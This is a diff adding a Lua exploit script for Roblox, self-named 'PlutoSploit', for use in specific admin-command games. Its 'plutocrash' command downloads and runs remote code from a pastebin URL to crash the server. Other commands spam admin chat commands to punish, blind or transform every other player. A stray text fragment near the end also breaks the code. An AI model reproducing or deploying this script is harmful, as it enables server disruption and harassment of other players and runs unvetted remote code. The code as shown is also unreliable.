@@ -1,0 +1,232 @@
+wait(.3)
+	if game.PlaceId ~= 112420803 then --BOOT AREA
+		if game.PlaceId ~= 115670532 then
+			return 
+		end
+	end
+	game.Players:Chat("h \n\n\n\n\n\n\\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\\n\n\n\n\n\n\press F9 for commands lol")
+print("MUSIC1-5 - Plays Audio")
+print("plutocrash - Crashes Server")
+print("rejoin - rejoins the server")
+------------------------------------------------------------------------------------------------------------
+
+-- Dont Change Anything Here.
+function chat(msg)
+	game.Players:Chat(msg)
+end
+------------------------------
+
+-- RANKS
+
+local owner = {"aligotoofed"}
+local Script_helper = {
+	"learnvamp",
+	"Fonalc" -- you can add multiple just add a comma to seperate.
+}
+
+
+-- For the love of god please dont touch the rank detector.
+if not table.find(owner,game.Players.LocalPlayer.Name) then if not table.find(Script_helper,game.Players.LocalPlayer.Name) then
+		chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n PlutoSploit. \n\n Script Detected, \n "..game.Players.LocalPlayer.Name.." Is -User- Rank")
+	end
+else
+	if table.find(owner,game.Players.LocalPlayer.Name) then
+		chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n PlutoSploit. \n\n Script Detected, \n "..game.Players.LocalPlayer.Name.." Is -Owner- Rank")
+	end
+end
+if table.find(Script_helper,game.Players.LocalPlayer.Name) then
+	chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n PlutoSploit. \n\n Script Detected, \n "..game.Players.LocalPlayer.Name.." Is -Script_Helper- Rank")
+end
+--------------------------------------------------------------------------------------------------------------------------------------
+--COMMANDS
+wait(10)
+--AntiDeath
+spawn(function()
+	while wait() do
+		if game.Players.LocalPlayer.Character.Humanoid.Health <9 then
+			if antideath then
+				chat("reset me")
+				wait(.2)
+				chat("god me")
+			end
+		end
+	end
+end)
+--TABBEDOUT
+game:GetService("UserInputService").WindowFocused:Connect(function() 
+	game.Players:Chat("refresh me")
+end)
+game:GetService("UserInputService").WindowFocusReleased:Connect(function()
+	game.Players:Chat("name me [Tabbed Out]\n"..game.Players.LocalPlayer.DisplayName) 
+	game.Players:Chat("god me") 
+	for _, part in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+		if part:IsA("BasePart") then
+			part.Anchored = false
+		end
+	end
+end)
+--COMMANDS--
+
+--PLUTOCRASH
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "plutocrash" then
+loadstring(game:HttpGet("https://pastebin.com/raw/58Zf5RsX"))()
+end
+end)
+--MUSICLIST
+
+--MUSIC1
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "music1" then
+game.Players:Chat("music 6897686359")
+end
+end)
+
+--MUSIC2
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "music2" then
+game.Players:Chat("music 6893776529")
+end
+end)
+
+--MUSIC3
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "music3" then
+game.Players:Chat("music 6819593773")
+end
+end)
+
+--MUSIC4
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "music4" then
+game.Players:Chat("music 6772846771")
+end
+end)
+
+--MUSIC5
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "music5" then
+game.Players:Chat("music 3656239030")
+end
+end)
+
+--REJOIN
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "rj" then
+local ts = game:GetService("TeleportService")
+
+local p = game:GetService("Players").LocalPlayer
+
+ 
+
+ts:Teleport(game.PlaceId, p)
+end
+end)
+
+--slock
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "slock" then
+game.Players:Chat("punish others")
+game.Players:Chat("punish others")
+game.Players:Chat("punish others")
+game.Players:Chat("punish others")
+game.Players:Chat("punish others")
+game.Players:Chat("blind others")
+game.Players:Chat("blind others")
+game.Players:Chat("blind others")
+game.Players:Chat("blind others")
+end
+end)
+
+--tickle
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "bark bark" then
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+game.Players:Chat("dog all")
+end
+end)
+
+--SERVERHOP
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+if msg == "serverhop" then
+Time = 1 -- seconds
+repeat wait() until game:IsLoaded()
+wait(Time)
+local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+local Deleted = false
+function TPReturner()
+   local Site;
+   if foundAnything == "" then
+       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+   else
+       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+   end
+   local ID = ""
+   if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+       foundAnything = Site.nextPageCursor
+   end
+   local num = 0;
+   for i,v in pairs(Site.data) do
+       local Possible = true
+       ID = tostring(v.id)
+       if tonumber(v.maxPlayers) > tonumber(v.playing) then
+           for _,Existing in pairs(AllIDs) do
+               if num ~= 0 then
+                   if ID == tostring(Existing) then
+                       Possible = false
+                   end
+               else
+                   if tonumber(actualHour) ~= tonumber(Existing) then
+                       local delFile = pcall(function()
+                           delfile("NotSameServers.json")
+                           AllIDs = {}
+                           table.insert(AllIDs, actualHour)
+                       end)
+                   end
+               end
+               num = num + 1
+           end
+           if Possible == true then
+               table.insert(AllIDs, ID)
+               wait()
+               pcall(function()
+                   writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                   wait()
+                   game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+               end)
+               wait(4)
+           end
+       end
+   end
+end
+ 
+function Teleport()
+   while wait() do
+       pcall(function()
+           TPReturner()
+           if foundAnything ~= "" then
+               TPReturner()
+           end
+       end)
+   end
+end
+ everything.
+Teleport()
+end
+end)
